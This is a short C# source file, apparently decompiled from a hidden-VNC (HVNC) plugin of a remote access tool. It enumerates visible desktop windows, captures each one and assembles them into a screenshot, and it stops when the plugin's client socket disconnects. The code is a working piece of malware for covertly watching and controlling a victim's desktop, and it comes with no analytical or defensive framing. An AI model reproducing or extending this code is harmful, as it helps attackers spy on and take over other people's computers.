using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using HVNC;
using S;

namespace VNC;

internal class HelperScreen
{
	public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public static List<IntPtr> Num_List;

	[DllImport("user32")]
	public static extern bool GetWindowRect(IntPtr hWnd, ref RECT lpRect);

	[DllImport("user32.dll")]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr PrintWindow(IntPtr hwnd, IntPtr hDC, uint nFlags);

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowDC(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC(IntPtr hDC);

	[DllImport("user32.dll")]
	public static extern IntPtr GetTopWindow(IntPtr hWnd);

	public static bool List_screen(IntPtr hWnd, int lParam)
	{
		bool result;
		try
		{
			if (IsWindowVisible(hWnd))
			{
				if (hWnd == IntPtr.Zero)
				{
					return false;
				}
				Num_List.Add(hWnd);
			}
			result = true;
		}
		catch
		{
			result = false;
		}
		return result;
	}

	public static Bitmap GetScreen(int x, int y)
	{
		Num_List = new List<IntPtr>();
		Bitmap bitmap = new Bitmap(x, y);
		if (EnumDesktopWindows(IntPtr.Zero, List_screen, IntPtr.Zero))
		{
			for (int i = Num_List.Count - 1; i > -1; i += -1)
			{
				if (!HVNC.Plugin.Helper.IsRunning && !HVNC.Plugin.ClientSocket.isConnected)
				{
					break;
				}
				RECT lpRect = default(RECT);
				IntPtr intPtr = Num_List[i];
				ScreenCapture screenCapture = new ScreenCapture();
				Bitmap image = screenCapture.CaptureWindow(Num_List[i]);
				GetWindowRect(Num_List[i], ref lpRect);
				using Graphics graphics = Graphics.FromImage(bitmap);
				graphics.DrawImage(image, lpRect.Left, lpRect.Top);
			}
		}
		return bitmap;
	}
}
